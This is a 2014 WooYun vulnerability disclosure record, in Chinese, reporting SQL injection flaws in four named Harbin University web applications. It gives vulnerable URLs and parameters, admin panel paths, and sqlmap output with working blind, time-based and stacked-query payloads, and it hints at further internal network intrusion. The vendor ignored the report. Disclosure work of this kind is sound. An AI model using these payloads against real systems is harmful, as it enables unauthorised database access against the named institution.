{"id": 43133, "wybug_id": "wooyun-2014-083727", "wybug_title": "多处sql注入漏洞打掉哈尔滨学院", "wybug_corp": "哈尔滨学院", "wybug_author": "Ev1l", "wybug_date": "2014-11-18 15:56", "wybug_open_date": "2014-11-23 15:58", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "已交由第三方合作机构(CCERT教育网应急响应组)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 看到升级实习了那就再来一发吧。因为和厂商的运维协商好了我发到乌云来~~要不然edu的修复速度你们懂的。xss还没来得及挖 详细说明：  <!--先吐槽一下 清一色的盲注让我情何以堪-->#第一发http://rjxy.hrbu.edu.cn/article/list_search.jspTitle参数存在注入用户为database management system users [1]:[*] 'root'@'%'sqlmap见漏洞证明（下同）#第二发http://jpkc.hrbu.edu.cn:8080/jpkcjs/sm/index2.aspid参数存在sql注入漏洞由于access数据库没有进行进一步测试。#第三发http://sjxy.hrbu.edu.cn/article/list_tzgg.jspsort参数存在注入用户为database management system users [1]:[*] 'root'@'%'#第四发http://jwcdata.hrbu.edu.cn:8080/wjxz2.jspsecondid参数存在注入当前用户database management system users [1]:[*] sa先发四个吧，继续附上后台地址，因为盲注的关系就没有跑数据，太慢了。#第一发http://rjxy.hrbu.edu.cn/admin#第三发http://sjxy.hrbu.edu.cn/admin   漏洞证明：  #第一发\nsqlmap identified the following injection points with a total of 66 HTTP(s) requests:---Place: POSTParameter: title    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: title=1%' AND 1711=1711 AND '%'='    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: title=1%' AND SLEEP(5) AND '%'='---[12:25:34] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[12:25:35] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 48 times\n#第二发\nsqlmap identified the following injection points with a total of 24 HTTP(s) requests:---Place: GETParameter: id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1 AND 1150=1150---[12:42:24] [INFO] testing Microsoft Access[12:42:25] [INFO] confirming Microsoft Access[12:42:26] [INFO] the back-end DBMS is Microsoft Accessweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft Access[12:42:26] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 22 times\n#第三发\nsqlmap identified the following injection points with a total of 60 HTTP(s) requests:---Place: GETParameter: sort    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sort=1322278772515 AND 4183=4183    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: sort=1322278772515 AND SLEEP(5)---[12:47:28] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.11[12:47:28] [WARNING] HTTP error codes detected during testing:500 (Internal Server Error) - 48 times\n#第四发\nsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: secondid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: secondid=107' AND 3874=3874 AND 'rBcJ'='rBcJ    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: secondid=107'; WAITFOR DELAY '0:0:5';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: secondid=107' WAITFOR DELAY '0:0:5'-----[18:07:15] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2000\n   修复方案：  自己处理下- -jsp得话因为是win系统应该就是system权限咯~漫游内网下一次再说   版权声明：转载请注明来源 Ev1l@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-23 15:58 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-11-24 10:45 |    \t\t随风 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 憨厚不代表没态度)\t\t \n  漏洞还没修复呢呀    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}